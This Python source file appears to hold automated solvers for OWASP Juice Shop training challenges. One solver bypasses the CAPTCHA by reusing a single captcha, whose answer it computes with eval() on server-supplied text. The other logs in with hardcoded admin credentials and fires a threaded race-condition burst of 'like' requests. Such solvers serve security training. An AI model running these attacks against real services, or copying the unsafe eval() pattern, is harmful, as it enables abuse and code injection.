from core.base_solver import BaseSolver
from loguru import logger
import threading
import time

class CAPTCHABypassSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "captchaBypassChallenge"

    def solve(self) -> bool:
        # Submit 10 or more customer feedbacks within 20 seconds.
        # We can reuse the same captcha or just solve it fast.
        # Actually, the trigger is in routes/verify.ts:
        # if (req.app.locals.captchaReqId >= 10) { ... }
        
        # 1. Get a captcha
        c_res = self.client.get("/api/Captchas")
        data = c_res.json()
        cid = data.get("captchaId")
        ans = str(eval(str(data.get("captcha"))))
        
        # 2. Submit quickly
        for _ in range(15):
             self.client.post("/api/Feedbacks", json={
                "captchaId": cid,
                "captcha": ans,
                "comment": "Automation is fun!",
                "rating": 3
            })
        return True

class MultipleLikesSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "timingAttackChallenge"

    def solve(self) -> bool:
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Get a product review
        # We need a review. Let's find one for product 1
        res = self.client.get("/rest/products/1/reviews")
        reviews = res.json().get("data", [])
        if not reviews:
             # Create a review first
             self.client.put("/rest/products/1/reviews", json={"message": "Good product!"}, headers=headers)
             res = self.client.get("/rest/products/1/reviews")
             reviews = res.json().get("data", [])
        
        if not reviews: return False
        review_id = reviews[0].get("_id")
        
        # 3. Race condition attack
        # Send 5 requests at once
        results = []
        def send_like():
             r = self.client.post("/rest/products/reviews", json={"id": review_id, "liked": True}, headers=headers)
             results.append(r)

        threads = []
        for _ in range(10):
            t = threading.Thread(target=send_like)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
            
        return True
